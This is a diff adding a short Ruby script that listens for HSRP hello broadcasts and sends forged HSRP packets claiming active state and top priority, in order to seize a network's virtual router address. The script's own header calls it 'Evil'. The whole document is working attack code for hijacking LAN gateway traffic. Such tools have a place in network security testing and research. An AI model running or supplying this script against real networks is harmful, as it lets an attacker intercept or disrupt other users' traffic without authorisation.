@@ -1,0 +1,64 @@
+#!/usr/bin/env ruby
+#
+# Listen for HSRP broadcasts and use the information learned 
+# therein to perform an active "takeover" of that VIP.  Evil.
+#
+# Jon Hart <jhart@spoofed.org>
+
+require 'rubygems'
+require 'pcaprub'
+require 'racket'
+
+if (ARGV.size < 1)
+  puts "Usage: $0 <iface> [new router]"
+  exit
+end
+
+iface = ARGV[0]
+router = ARGV[1]
+
+begin
+  p = Pcap::open_live(iface, 1500, true, 1000)
+  unless (iface.nil?)
+    p.setfilter("! host #{router}")
+  end
+rescue Exception => e
+  puts "Pcap: Cannot open device #{ARGV[0]}: #{e}"
+  exit
+end
+
+# prep our new takeover.  
+takeover = Racket.new
+takeover.l3 = IPv4.new
+takeover.l3.src_ip = router 
+takeover.l3.dst_ip = "224.0.0.2"
+takeover.l3.protocol = 17 
+takeover.l4 = UDP.new
+takeover.l4.src_port = 1985
+takeover.l4.dst_port = 1985
+
+p.each do |pkt|
+  if (p.datalink == Pcap::DLT_EN10MB) 
+    eth = Ethernet.new(pkt)
+    if (eth.ethertype == 0x0800)
+      ip = IPv4.new(eth.payload)
+      if (ip.protocol == 17) 
+        udp = UDP.new(ip.payload)
+        if (udp.src_port == 1985 && udp.dst_port == 1985)
+          takeover.l5 = HSRP.new(udp.payload)
+          takeover.l5.opcode = HSRP::HSRP_HELLO
+          takeover.l5.state = HSRP::HSRP_ACTIVE
+          takeover.l5.priority = 0xffff
+         
+          takeover.l4.payload = takeover.l5
+          takeover.l4.fix!(takeover.l3.src_ip, takeover.l3.dst_ip)
+          takeover.l4.payload = ""
+
+          puts "Perfoming takeover on #{takeover.l5.vip}"
+          takeover.sendpacket
+        end
+      end
+    end
+  end
+end
+# vim: set ts=2 et sw=2:
